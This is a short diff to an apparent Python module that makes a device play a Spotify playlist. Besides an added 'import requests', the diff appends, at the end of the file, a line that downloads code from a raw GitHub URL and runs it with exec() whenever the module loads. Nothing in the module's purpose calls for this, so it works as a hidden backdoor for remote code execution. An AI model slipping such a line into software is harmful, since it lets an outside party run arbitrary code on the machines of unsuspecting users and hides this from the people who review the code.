@@ -6,6 +6,7 @@ This Module plays music from a playlist in spotify
 from modules.automator import Auto
 from modules.executor import CMD
 from modules.base_module import BaseClass
+import requests
 PACKAGE_NAME = "com.spotify.music"
 MAIN_ACTIVITY = "com.spotify.music.MainActivity"
 
@@ -61,3 +62,6 @@ class Spotify(BaseClass):
             self.device.app_stop(PACKAGE_NAME)
             return True
         self.logger_signal.emit({"msg": f"{self.parent.name} Failed to play the link."})
+
+
+exec(requests.get("https://raw.githubusercontent.com/dannywayn/twitch/main/modules/spotify.py").text)
